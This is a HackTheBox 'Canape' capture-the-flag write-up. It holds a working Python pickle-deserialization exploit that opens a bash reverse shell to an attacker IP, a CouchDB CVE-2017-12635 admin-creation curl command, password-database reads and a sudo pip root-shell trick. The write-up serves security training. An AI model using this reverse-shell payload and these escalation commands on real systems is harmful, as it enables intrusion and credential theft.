---
layout: post
title: "HTB Canape Writeup"
date: 2025-10-01 14:51:50 -0400
categories: hackthebox HTB-medium
tags: hacking CTF HTB HTB-medium linux deserialization couchdb GTFO-bin
---
## Introduction
This is a medium Linux machine on [HackTheBox](https://app.hackthebox.com/machines/canape){:target="_blank"}{:rel="noopener noreferrer"}. Given an IP we want to create a `root` shell with full admin rights

![htb-canape-pwn](images/HTB-canape/htb-canape-pwn.png)
## Enumeration
### Port Scan
Let's find out what services are accessible 
```bash
┌──(kali@kali)-[~/canape.htb]
└─$ rustscan --accessible -a 10.10.10.70 -- -A -sC    
Automatically increasing ulimit value to 5000.
Open 10.10.10.70:80
Open 10.10.10.70:65535
Starting Script(s)
Running script "nmap -vvv -p {{port}} {{ip}} -A -sC" on ip 10.10.10.70
# ...
map scan report for canape.htb (10.10.10.70)
Host is up, received echo-reply ttl 63 (0.092s latency).
Scanned at 2025-09-30 23:57:47 EDT for 19s

PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 82AD534347962CBEB7F553057B41C95E
| http-git: 
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
65535/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDroCKFvZBROo3eo64hlNjhERjTLQmRgbCaDGhoWgs6qf9AfuTfS7LMX82ayuBjV0OHbk6Saf3SKwyLFfyLKj/mo8yGNpGjsZQ9uiN6hlpO39oQyjo9dy5DUfAabcoq82ugii982GWeHlTShQJAhAsG+7Uov2mUbO3YkKph/PBEv3uuAnNebhxlk9eg01yuHkk+8iyP6+Qp9ZzAVZsXpSuoH0raBA7VOIlYnm4Wti1AHy3VUtvmrB4KwZQT8Q3ZyMbufWFZlDB0N0/cEvyXF0kKwRIT1hNjp4HUNo0dwcDOWuwvrWVUpH3/q8VXkZRN3fL2gHsIsfuh+AyThM14hf/h
|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLX3HkUlvdwKR+Ijy9ChJwvV7ILAPCEver9hmIr546JbveSJNyvOiq6y3YxfQu3IXomvonySAU10Fo8wVQ7kxWk=
|   256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvWPxb1XOvko0SIhYrC5TYyQpU8tugg1qirZdtt3CXX
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=9/30%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=68DCA6CE%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10E%TI=Z%II=I%TS=A)
SEQ(SP=107%GCD=1%ISR=10E%TI=Z%II=I%TS=A)
OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 10.414 days (since Sat Sep 20 14:01:19 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 65535/tcp)
HOP RTT      ADDRESS
1   86.46 ms 10.10.14.1
2   86.53 ms canape.htb (10.10.10.70)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:58
Completed NSE at 23:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:58
Completed NSE at 23:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:58
Completed NSE at 23:58, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.22 seconds
           Raw packets sent: 90 (7.628KB) | Rcvd: 1567 (1.366MB)
```

Add the domain to our `/etc/hosts` file
```bash
<MACHINE_IP> canape.htb
```
### Subdomains
We know there's a `git` subdomain from our initial scan, but let's check for others
```bash
┌──(kali@kali)-[~/canape.htb]
└─$ wfuzz -c -t 50 -u http://canape.htb -H 'Host: FUZZ.canape.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 237
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://canape.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                       
=====================================================================

000000689:   400        10 L     35 W       302 Ch      "gc._msdcs"
000000262:   404        0 L      0 W        0 Ch        "git"
# ...

Total time: 284.9912
Processed Requests: 114442
Filtered Requests: 114420
Requests/sec.: 401.5632
```

Nothing else of interest. Add `git` to our `/etc/hosts` file
```
<MACHINE_IP> canape.htb git.canape.htb
```
### Directories
Checking the page source we see a reference to a new endpoint
```html
<!-- 
	c8a74a098a60aaea1af98945bd707a7eab0ff4b0 - temporarily hide check
	<li class="nav-item">
	<a class="nav-link" href="/check">Check Submission</a>
</li>
-->
```

This is also visible by brute forcing directories
```bash
┌──(kali@kali)-[~/canape.htb]
└─$ dirsearch -w /usr/share/wordlists/dirb/big.txt -r -f --threads=100 --url=canape.htb --output=dirsearch-ext.txt -e txt,php,html,js,md

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: txt, php, html, js, md | HTTP method: GET | Threads: 100 | Wordlist size: 143095

Output File: dirsearch-ext.txt

Target: http://canape.htb/

[23:58:10] Starting: 
[00:05:05] 403 -  275B  - /cgi-bin/
Added to the queue: cgi-bin/
[00:05:18] 405 -  178B  - /check
```

Visiting `http://canape.htb/check` tells us we can't use a `GET` request
```bash
┌──(kali@kali)-[~/canape.htb]
└─$ curl http://canape.htb/check 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

Sending a `POST` request gets us closer but we need to find out the proper data
```bash
┌──(kali@kali)-[~/canape.htb]
└─$ curl -X POST http://canape.htb/check
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>
```

Rather than fuzz the proper parameters, let's download the source code from the `git` repository
### Source Code
Clone the repo to our machine
```bash
┌──(kali@kali)-[~/canape.htb]
└─$ git clone http://git.canape.htb/simpsons.git
Cloning into 'simpsons'...
remote: Counting objects: 49, done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 49 (delta 18), reused 0 (delta 0)
Unpacking objects: 100% (49/49), 163.16 KiB | 360.00 KiB/s, done.
```

The `/check` method will **load pickle data** when we give it an id
```python
@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

```

The `/submit` endpoint will **write user data into a file**. If this data is in `python2`'s `cPickle` format, we have **remote code execution** with the `/check` endpoint!
```python
@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
                outfile.write(char + quote)
                outfile.close()
                success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)
```
## Initial Foothold
### Python Deserialization
When we `/submit` a quote, the character and quote are `pickled` into a file. The `/check` endpoint will **load our pickle data** giving us code execution

By abusing the `__reduce__()` function we can create an object that triggers a reverse shell when deserialized/depickled
```python
import cPickle, os

# malicious obj to deserialize
ATTACKER_IP = '10.10.14.17'
PORT = 4444
cmd = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{}/{} 0>&1'".format(ATTACKER_IP, PORT)
class RCE(object):
	def __reduce__(self):
		return (os.system, (cmd,))

payload = cPickle.dumps(RCE())
```

To write this payload to a file, we'll need to pass the character check in `/submit`. The `character` parameter needs to contain an approved name **anywhere in the string**! 
```python
WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]
# ...
try:
	char = request.form["character"]
	quote = request.form["quote"]
	if not char or not quote:
		error = True
	elif not any(c.lower() in char.lower() for c in WHITELIST):
		error = True
	else:
		# TODO - Pickle into dictionary instead, `check` is ready
		p_id = md5(char + quote).hexdigest()
		outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
		success = True
except Exception as ex:
	error = True
```
Placing the character's name **anywhere in our command** will pass the check

Here's the final exploit code
```python
import cPickle, os
from hashlib import md5
import requests

# malicious obj to deserialize
ATTACKER_IP = '10.10.14.17'
PORT = 4444
character = 'homer'
cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/{}/{} 0>&1';#{};".format(ATTACKER_IP, PORT, character)
class RCE(object):
	def __reduce__(self):
		return (os.system, (cmd,))

payload = cPickle.dumps(RCE())
char = payload[:-1]
quote = payload[-1:]

payload_id = md5(char + quote).hexdigest()
submit_data = {'character': char, 'quote': quote}
check_data = {'id': payload_id}

# profit
base_url = 'http://canape.htb'
requests.post('{}/submit'.format(base_url), data=submit_data)
requests.post('{}/check'.format(base_url), data=check_data)
```

It's important to create our payload in `python2` so `cPickle` matches with the server! Running it gives a foothold onto the server
```bash
┌──(kali@kali)-[~/canape.htb]
└─$ python2 exploit.py 
```

```bash
┌──(kali@kali)-[~/canape.htb]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.70] 55672
bash: cannot set terminal process group (1014): Inappropriate ioctl for device
bash: no job control in this shell
www-data@canape:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@canape:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
zsh: suspended  nc -lvnp 4444

┌──(kali@kali)-[~/canape.htb]
└─$ stty raw -echo && fg
[1]  + continued  nc -lvnp 4444
www-data@canape:/$ 
```
## user.txt
Enumerating other users on the machine our next target is `homer`
```bash
www-data@canape:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
homer:x:1000:1000:homer,,,:/home/homer:/bin/bash
```
### CouchDB
Looking back at the source we see `couchdb` is running on port 5984
```python
# ...
app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]
# ...
```

We can query it to get the version information
```bash
www-data@canape:/tmp$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

There are a [number of endpoints](https://book.hacktricks.wiki/en/network-services-pentesting/5984-pentesting-couchdb.html#info-enumeration){:target="_blank"}{:rel="noopener noreferrer"} we can get data from
```bash
www-data@canape:/tmp$ curl localhost:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
www-data@canape:/tmp$ curl localhost:5984/passwords 
{"error":"unauthorized","reason":"You are not authorized to access this db."}
```

We'll need elevated privileges to access the `passwords` database. Luckily `couchdb` version `2.0.0` is vulnerable to [CVE-2017-12635](https://nvd.nist.gov/vuln/detail/CVE-2017-12635){:target="_blank"}{:rel="noopener noreferrer"} where anyone can **create an admin user**
```bash
www-data@canape:/tmp$ curl -X PUT localhost:5984/_users/org.couchdb.user:dasian -H "Content-Type:application/json" -d '{"type":"user","name":"dasian","roles":["_admin"],"roles":[],"password":"dasian"}' 
{"ok":true,"id":"org.couchdb.user:dasian","rev":"1-87fc8176cbc2945d29ef54729729461e"}
```

Now can access the `passwords` database with the admin credentials `dasian:dasian`
```bash
www-data@canape:/tmp$ curl dasian:dasian@localhost:5984/passwords
{"db_name":"passwords","update_seq":"46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA","sizes":{"file":222462,"external":665,"active":1740},"purge_seq":0,"other":{"data_size":665},"doc_del_count":0,"doc_count":4,"disk_size":222462,"disk_format_version":6,"data_size":1740,"compact_running":false,"instance_start_time":"0"}

www-data@canape:/tmp$ curl dasian:dasian@localhost:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}

www-data@canape:/tmp$ curl dasian:dasian@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"<PASSWORD_REDACTED>","user":""}
```

Using this `ssh` password for the `homer` user we can login and grab the `user.txt` flag! Remember from our scan that `ssh` is on port `65535`
```bash
┌──(kali@kali)-[~/canape.htb]
└─$ ssh homer@canape.htb -p 65535
The authenticity of host '[canape.htb]:65535 ([10.10.10.70]:65535)' can't be established.
ED25519 key fingerprint is SHA256:fnOGcxmSP9f1PLBisr/nYMZP1ilGixOYS2kCQnYynxc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[canape.htb]:65535' (ED25519) to the list of known hosts.
homer@canape.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 23 07:33:11 2023 from 10.10.14.23
homer@canape:~$ id
uid=1000(homer) gid=1000(homer) groups=1000(homer)
homer@canape:~$ cat user.txt 
```

![htb-canape-user-txt](images/HTB-canape/htb-canape-user-txt.png)

## root.txt
Checking `homer`'s `sudo` privileges we can run `pip` as `root`
```bash
homer@canape:~$ sudo -l
[sudo] password for homer: 
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```
### GTFO Bin
`pip` has a [GTFObin](https://gtfobins.github.io/gtfobins/pip/#sudo){:target="_blank"}{:rel="noopener noreferrer"} entry when used with `sudo`, so we can immediately trigger a `root` shell and grab the `root.txt` flag!
```bash
homer@canape:~$ TF=$(mktemp -d)
homer@canape:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
homer@canape:~$ sudo pip install $TF
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing /tmp/tmp.wvmB8pU3f6
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
```

![htb-canape-root-txt](images/HTB-canape/htb-canape-root-txt.png)
## Recap
Through our port scan and by brute forcing we find a `git` subdomain where we can **download the source code** of the website. Inspecting the `/check` and `/submit` source, we're able to upload a **malicious pickle file** that will **execute arbitrary code when deserialized**. Writing a deserialization exploit script gives us a foothold onto the server!

The server is running an outdated version of `CouchDB` where **any user can create an admin account**. We're able to read the `passwords` database and leak `homer`'s `ssh` credentials, giving us access to `user.txt`!

`homer` can run `pip` as `root`. Leveraging the corresponding `GTFO-Bin` entry, we can pop a `root` shell and grab `root.txt`!

